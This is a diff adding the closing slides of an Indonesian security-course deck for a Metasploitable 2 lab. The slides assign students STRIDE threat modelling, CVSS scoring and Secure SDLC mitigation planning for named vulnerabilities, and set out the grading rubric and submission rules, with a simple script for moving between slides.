+      <p style="font-size:12.5px;color:#555;"><strong>💡 Panduan CWE:</strong> Contoh CWE yang relevan: CWE-912 (Hidden Functionality/Backdoor), CWE-78 (OS Command Injection), CWE-521 (Weak Password Requirements), CWE-20 (Improper Input Validation). Kunjungi cwe.mitre.org untuk referensi lengkap.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 18 – TUGAS 2: STRIDE & CVSS (WEEK 2) -->
+<div class="slide" id="s18" data-title="Tugas 2 – Threat Modeling STRIDE & CVSS (Kaitan Week 2)">
+  <div class="slide-header">
+    <div class="section-label">Tugas Praktik 2 — Kaitan Week 2</div>
+    <h2>Tugas 2: Threat Modeling STRIDE &amp; Penilaian CVSS</h2>
+    <p>Hubungkan temuan praktikum dengan metodologi threat modeling dan penilaian risiko dari Pertemuan 2</p>
+  </div>
+  <div class="slide-body">
+    <div class="info-box blue" style="margin-bottom:14px;">
+      <span class="info-icon">📚</span>
+      <div><strong>Koneksi ke Materi Week 2:</strong> Pertemuan 2 membahas model ancaman STRIDE (Spoofing, Tampering, Repudiation, Info Disclosure, Denial of Service, Elevation of Privilege) dan penilaian tingkat keparahan menggunakan CVSS (Common Vulnerability Scoring System).</div>
+    </div>
+
+    <div class="card-grid-2">
+      <div>
+        <h3 class="section-h">Bagian A – Analisis STRIDE</h3>
+        <div class="step-list">
+          <div class="step-item">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <strong>Petakan setiap kerentanan ke kategori STRIDE</strong>
+              <p>Identifikasi satu atau lebih kategori STRIDE yang paling menggambarkan ancaman dari setiap kerentanan yang ditemukan di lab.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <strong>Identifikasi aset yang terancam</strong>
+              <p>Untuk setiap kerentanan, tentukan aset apa yang paling berisiko: data pengguna, proses sistem, konfigurasi layanan, atau ketersediaan sistem.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <strong>Buat diagram alur ancaman sederhana</strong>
+              <p>Untuk <strong>satu kerentanan pilihan</strong>, gambarkan diagram alur: <em>Attacker → Entry Point → Kerentanan → Dampak</em>. Dapat dibuat secara manual atau dengan draw.io.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Bagian B – Penilaian CVSS v3.1</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:10px;">Hitung CVSS Base Score untuk <strong>2 kerentanan</strong> dari temuan lab menggunakan CVSS Calculator:</p>
+        <div class="code-block" style="font-size:11.5px;">
+<span class="comment"># CVSS v3.1 Calculator (online):</span>
+<span class="cmd">https://www.first.org/cvss/calculator/3.1</span>
+<br><br>
+<span class="comment"># Metrik yang harus diisi:</span>
+<span class="comment"># Attack Vector (AV): Network/Adjacent/Local/Physical</span>
+<span class="comment"># Attack Complexity (AC): Low / High</span>
+<span class="comment"># Privileges Required (PR): None/Low/High</span>
+<span class="comment"># User Interaction (UI): None / Required</span>
+<span class="comment"># Scope (S): Unchanged / Changed</span>
+<span class="comment"># Confidentiality Impact (C): N/L/H</span>
+<span class="comment"># Integrity Impact (I): N/L/H</span>
+<span class="comment"># Availability Impact (A): N/L/H</span>
+        </div>
+        <div class="info-box orange" style="margin-top:10px;">
+          <span class="info-icon">📊</span>
+          <div style="font-size:12px;"><strong>Dokumen:</strong> Sertakan nilai CVSS Vector String, Base Score, dan rating (Critical/High/Medium/Low) dalam laporan. Contoh: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></div>
+        </div>
+      </div>
+    </div>
+
+    <h3 class="section-h" style="margin-top:14px;">Template Tabel STRIDE</h3>
+    <table class="summary-table">
+      <thead>
+        <tr><th>Kerentanan</th><th>Kategori STRIDE</th><th>Aset Terancam</th><th>CVSS Score</th><th>Rating</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>VSFTPD 2.3.4</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[hitung]</td><td><span class="tag tag-red">Critical</span></td></tr>
+        <tr><td>PHP CGI RCE</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[hitung]</td><td><span class="tag tag-red">Critical</span></td></tr>
+        <tr><td>TWiki Exec</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[hitung]</td><td><span class="tag tag-orange">High</span></td></tr>
+        <tr><td>Samba Usermap</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[hitung]</td><td><span class="tag tag-red">Critical</span></td></tr>
+        <tr><td>PostgreSQL UDF</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[isi]</td><td style="color:#aaa;font-style:italic;">[hitung]</td><td><span class="tag tag-orange">High</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 19 – TUGAS 3: MITIGASI (WEEK 3) -->
+<div class="slide" id="s19" data-title="Tugas 3 – Rencana Mitigasi (Kaitan Week 3)">
+  <div class="slide-header">
+    <div class="section-label">Tugas Praktik 3 — Kaitan Week 3</div>
+    <h2>Tugas 3: Rencana Mitigasi Berbasis Secure SDLC</h2>
+    <p>Hubungkan temuan praktikum dengan strategi mitigasi keamanan dari Pertemuan 3</p>
+  </div>
+  <div class="slide-body">
+    <div class="info-box blue" style="margin-bottom:14px;">
+      <span class="info-icon">📚</span>
+      <div><strong>Koneksi ke Materi Week 3:</strong> Pertemuan 3 membahas strategi mitigasi keamanan perangkat lunak: patch management, hardening konfigurasi, prinsip <em>least privilege</em>, input validation, dan penerapan dalam siklus Secure SDLC. Tugas ini merancang rencana mitigasi nyata berdasarkan temuan lab.</div>
+    </div>
+
+    <div class="card-grid-2">
+      <div>
+        <h3 class="section-h">Bagian A – Mitigasi Teknis per Kerentanan</h3>
+        <div class="step-list">
+          <div class="step-item">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <strong>Tentukan mitigasi teknis untuk setiap kerentanan</strong>
+              <p>Setidaknya <strong>2 langkah mitigasi konkret</strong> per kerentanan. Contoh: upgrade versi, disable service, ubah konfigurasi, ganti password, tambahkan firewall rule.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <strong>Kategorikan mitigasi: Preventif, Detektif, atau Korektif</strong>
+              <p>Klasifikasikan setiap langkah mitigasi berdasarkan tipenya dalam konteks kontrol keamanan.</p>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <strong>Tentukan prioritas remediasi berdasarkan CVSS Score</strong>
+              <p>Urutkan kerentanan dari yang paling kritis untuk ditangani terlebih dahulu. Gunakan hasil CVSS dari Tugas 2 sebagai dasar prioritas.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Bagian B – Posisi Mitigasi dalam Secure SDLC</h3>
+        <p style="font-size:13px;color:#555;margin-bottom:10px;">Tentukan pada fase SDLC mana mitigasi seharusnya diterapkan untuk <strong>mencegah</strong> setiap kerentanan muncul sejak awal:</p>
+        <div class="card" style="border-top:3px solid var(--pssn-blue);margin-bottom:10px;">
+          <table style="width:100%;border-collapse:collapse;font-size:12px;">
+            <tr style="background:#f0f4f8;"><th style="padding:6px 10px;text-align:left;">Fase SDLC</th><th style="padding:6px 10px;text-align:left;">Contoh Kontrol</th></tr>
+            <tr><td style="padding:6px 10px;border-bottom:1px solid #eee;font-weight:600;color:var(--pssn-blue);">Requirements</td><td style="padding:6px 10px;border-bottom:1px solid #eee;color:#555;">Security requirements: no default credentials</td></tr>
+            <tr><td style="padding:6px 10px;border-bottom:1px solid #eee;font-weight:600;color:var(--pssn-blue);">Design</td><td style="padding:6px 10px;border-bottom:1px solid #eee;color:#555;">Threat modeling, minimal service exposure</td></tr>
+            <tr><td style="padding:6px 10px;border-bottom:1px solid #eee;font-weight:600;color:var(--pssn-blue);">Implementation</td><td style="padding:6px 10px;border-bottom:1px solid #eee;color:#555;">Input validation, safe API, no backdoor</td></tr>
+            <tr><td style="padding:6px 10px;border-bottom:1px solid #eee;font-weight:600;color:var(--pssn-blue);">Testing</td><td style="padding:6px 10px;border-bottom:1px solid #eee;color:#555;">Vulnerability scanning, penetration testing</td></tr>
+            <tr><td style="padding:6px 10px;font-weight:600;color:var(--pssn-blue);">Deployment</td><td style="padding:6px 10px;color:#555;">Patch management, hardening, monitoring</td></tr>
+          </table>
+        </div>
+        <div class="info-box green">
+          <span class="info-icon">✅</span>
+          <div style="font-size:12px;"><strong>Untuk setiap kerentanan:</strong> Tentukan fase SDLC di mana kontrol pencegahan seharusnya ditempatkan, dan sebutkan nama kontrol/mekanisme spesifiknya.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 20 – RUBRIK & PENGUMPULAN -->
+<div class="slide" id="s20" data-title="Rubrik Penilaian & Panduan Pengumpulan">
+  <div class="slide-header">
+    <div class="section-label">Rubrik &amp; Pengumpulan</div>
+    <h2>Rubrik Penilaian &amp; Panduan Pengumpulan Laporan</h2>
+    <p>Laporan praktik dikumpulkan sebagai satu dokumen PDF yang mencakup Tugas 1, 2, dan 3</p>
+  </div>
+  <div class="slide-body">
+    <div class="card-grid-2">
+      <div>
+        <h3 class="section-h">Komponen Penilaian</h3>
+        <table class="summary-table">
+          <thead>
+            <tr><th>Komponen</th><th>Bobot</th><th>Kriteria Utama</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Laporan Utama</strong><br><small style="color:#888;">Port scan, enum, validasi</small></td>
+              <td style="text-align:center;"><span class="tag tag-blue">30%</span></td>
+              <td style="font-size:12px;color:#555;">Screenshot bukti setiap tahap, tabel temuan lengkap, perintah yang digunakan</td>
+            </tr>
+            <tr>
+              <td><strong>Tugas 1</strong><br><small style="color:#888;">CIA &amp; CWE</small></td>
+              <td style="text-align:center;"><span class="tag tag-orange">20%</span></td>
+              <td style="font-size:12px;color:#555;">Ketepatan nomor CWE, kedalaman analisis dampak CIA, justifikasi yang logis</td>
+            </tr>
+            <tr>
+              <td><strong>Tugas 2</strong><br><small style="color:#888;">STRIDE &amp; CVSS</small></td>
+              <td style="text-align:center;"><span class="tag tag-orange">25%</span></td>
+              <td style="font-size:12px;color:#555;">Pemetaan STRIDE tepat, CVSS vector string valid, diagram alur ancaman</td>
+            </tr>
+            <tr>
+              <td><strong>Tugas 3</strong><br><small style="color:#888;">Mitigasi SDLC</small></td>
+              <td style="text-align:center;"><span class="tag tag-green">25%</span></td>
+              <td style="font-size:12px;color:#555;">Mitigasi konkret &amp; feasible, prioritas berbasis CVSS, pemetaan fase SDLC akurat</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div>
+        <h3 class="section-h">Format &amp; Ketentuan Pengumpulan</h3>
+        <ul class="step-list" style="list-style:none;">
+          <li style="display:flex;gap:12px;margin-bottom:10px;">
+            <div style="width:24px;height:24px;background:var(--pssn-blue);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:11px;font-weight:800;flex-shrink:0;">📄</div>
+            <div style="font-size:13px;color:#444;"><strong>Format:</strong> PDF, maks. 20 halaman (tidak termasuk lampiran screenshot)</div>
+          </li>
+          <li style="display:flex;gap:12px;margin-bottom:10px;">
+            <div style="width:24px;height:24px;background:var(--pssn-blue);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:11px;font-weight:800;flex-shrink:0;">👤</div>
+            <div style="font-size:13px;color:#444;"><strong>Nama file:</strong> <code>[NIM]_[Nama]_Praktik_Week4.pdf</code></div>
+          </li>
+          <li style="display:flex;gap:12px;margin-bottom:10px;">
+            <div style="width:24px;height:24px;background:var(--pssn-blue);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:11px;font-weight:800;flex-shrink:0;">⏰</div>
+            <div style="font-size:13px;color:#444;"><strong>Deadline:</strong> Sebelum pertemuan Week 5 dimulai</div>
+          </li>
+          <li style="display:flex;gap:12px;margin-bottom:10px;">
+            <div style="width:24px;height:24px;background:var(--pssn-blue);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:11px;font-weight:800;flex-shrink:0;">🔗</div>
+            <div style="font-size:13px;color:#444;"><strong>Platform:</strong> Upload ke LMS/eLearning PSSN sesuai instruksi dosen</div>
+          </li>
+          <li style="display:flex;gap:12px;margin-bottom:10px;">
+            <div style="width:24px;height:24px;background:var(--accent-red);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:11px;font-weight:800;flex-shrink:0;">⚠️</div>
+            <div style="font-size:13px;color:#444;"><strong>Integritas:</strong> Laporan dikerjakan secara mandiri. Plagiarisme atau berbagi laporan antar mahasiswa mendapat nilai nol.</div>
+          </li>
+        </ul>
+        <div class="info-box green" style="margin-top:10px;">
+          <span class="info-icon">🏆</span>
+          <div style="font-size:12.5px;"><strong>Tips Mendapat Nilai Penuh:</strong> Setiap klaim analisis harus didukung bukti screenshot yang jelas (beri anotasi/highlight jika perlu). Referensi CWE dan CVSS harus dari sumber resmi (cwe.mitre.org dan first.org/cvss).</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ SLIDE 21 – PENUTUP -->
+<div class="slide" id="s21" data-title="Penutup">
+  <div id="s17-inner" style="
+    background: linear-gradient(135deg, #081a45 0%, #0d2b6b 50%, #7b0d1e 100%);
+    min-height: 100%; display: flex; flex-direction: column;
+    justify-content: center; align-items: center; text-align: center;
+    padding: 40px; position: relative;
+  ">
+    <div style="position:relative;z-index:1;max-width:700px;">
+      <div style="font-size:48px;margin-bottom:20px;">🛡️</div>
+      <div style="color:var(--pssn-gold);font-weight:800;font-size:13px;letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;">Kesimpulan Praktik Week 4</div>
+      <div style="color:white;font-size:26px;font-weight:800;line-height:1.3;margin-bottom:16px;">
+        Identifikasi Kerentanan yang Sistematis adalah Kunci Keamanan
+      </div>
+      <div style="color:rgba(255,255,255,0.75);font-size:14px;line-height:1.8;margin-bottom:28px;">
+        Pada praktik ini Anda telah mempelajari bagaimana melakukan <strong style="color:var(--pssn-lightgold);">port scanning</strong>, <strong style="color:var(--pssn-lightgold);">identifikasi kerentanan</strong>, dan <strong style="color:var(--pssn-lightgold);">validasi</strong> menggunakan Metasploit pada 5 layanan berbeda di Metasploitable 2. Metodologi ini mencerminkan langkah nyata yang digunakan dalam penetration testing profesional.
+      </div>
+      <div style="display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-bottom:24px;">
+        <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:10px;padding:12px 20px;color:white;font-size:13px;">
+          <div style="font-size:22px;font-weight:800;color:var(--pssn-gold);">5</div>
+          <div>Kerentanan<br>Diidentifikasi</div>
+        </div>
+        <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:10px;padding:12px 20px;color:white;font-size:13px;">
+          <div style="font-size:22px;font-weight:800;color:var(--pssn-gold);">3</div>
+          <div>Tools Utama<br>Digunakan</div>
+        </div>
+        <div style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:10px;padding:12px 20px;color:white;font-size:13px;">
+          <div style="font-size:22px;font-weight:800;color:var(--pssn-gold);">5</div>
+          <div>Sesi Shell<br>Diperoleh</div>
+        </div>
+      </div>
+      <div style="color:rgba(255,255,255,0.5);font-size:12px;">
+        RKS222 – Keamanan Web &amp; Peranti Bergerak &nbsp;|&nbsp; PSSN &nbsp;|&nbsp; Week 4
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /slideshow -->
+
+<!-- NAV BAR -->
+<div id="navbar">
+  <button class="nav-btn" id="btnPrev" onclick="changeSlide(-1)" disabled>← Prev</button>
+  <div id="slide-title-bar"></div>
+  <div id="progress-bar"><div id="progress-fill"></div></div>
+  <div id="slide-counter"></div>
+  <button class="nav-btn" id="btnNext" onclick="changeSlide(1)">Next →</button>
+</div>
+
+<script>
+  const slides = document.querySelectorAll('.slide');
+  let cur = 0;
+  const total = slides.length;
+
+  function changeSlide(dir) {
+    slides[cur].classList.remove('active');
+    cur = Math.max(0, Math.min(total - 1, cur + dir));
+    slides[cur].classList.add('active');
+    updateNav();
+    slides[cur].scrollTop = 0;
+  }
+
+  function updateNav() {
+    document.getElementById('slide-counter').textContent = `${cur + 1} / ${total}`;
+    document.getElementById('progress-fill').style.width = `${((cur + 1) / total) * 100}%`;
+    document.getElementById('slide-title-bar').textContent = slides[cur].dataset.title || '';
+    document.getElementById('btnPrev').disabled = cur === 0;
+    document.getElementById('btnNext').disabled = cur === total - 1;
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown') changeSlide(1);
+    if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')   changeSlide(-1);
+  });
+
+  updateNav();
+</script>
+</body>
+</html>
